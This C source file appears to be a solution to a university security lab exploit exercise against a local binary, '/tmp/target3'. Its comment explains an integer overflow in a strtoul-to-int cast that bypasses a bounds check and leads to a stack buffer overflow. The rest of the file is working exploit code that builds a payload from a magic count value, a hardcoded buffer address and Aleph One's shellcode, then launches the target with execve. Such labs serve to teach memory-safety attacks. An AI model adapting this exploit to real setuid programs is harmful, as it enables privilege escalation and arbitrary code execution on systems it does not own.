#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define EGG_SIZE 20028 /* size of exploit string */ 

/* 
 * Main idea of exploit:
 *     The main idea of is to exploit an integer
 *     overflow vulnerability in the line:
 *       count = (int)strtoul(argv[1], &in, 10);
 *     of target3.c. Note strtoul reads an unsigned
 *     long from a string of characters. We arrange
 *     our input so that this unsigned long is very 
 *     large so that the cast to an int will overflow
 *     causing 'count' to be negative. Thus the test:
 *       if (count < MAX_WIDGETS) 
 *     will pass. Finally, since memcpy takes in a size_t 
 *     as its last argument, we will overflow buf in:
 *       memcpy(buf, in, count * sizeof(struct widget_t));
 *     The rest is boilerplate stack smashing. 
 */

int main(void)
{
  char *args[3];
  char *env[1];
  char *magic = " 4080219932,"; /* This is the magical number that when casted
                                   to an int will overflow count by the right 
                                   amount so that we can fill the buffer
                                   in foo with shellcode and overwrite 
                                   the return address of foo. */
  long buffAddr, *addrPtr;
  char egg[EGG_SIZE]; /* string containing exploit code */
  char *ptr;
  int i;

  buffAddr = 0xBFFF61C8; /* start address of buf in target3.c:foo */
  
  /* First fill the exploit string with the address of the buf in foo. 
     This will ensure that we overwrite the return address with the 
     start address of our code. */
  addrPtr = (long *) egg; 
  for (i = 0; i < EGG_SIZE; i += 4)
    *(addrPtr++) = buffAddr;
  
  /* Copy the magical string to the beggining, dont copy the null byte. */
  memcpy (egg, magic, strlen (magic));
  	
  /* Then fill the next bytes of the exploit string with
     Aleph One's shellcode */
  ptr = &egg[strlen (magic)];
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  egg[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */

  args[0] = TARGET; args[1] = egg; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
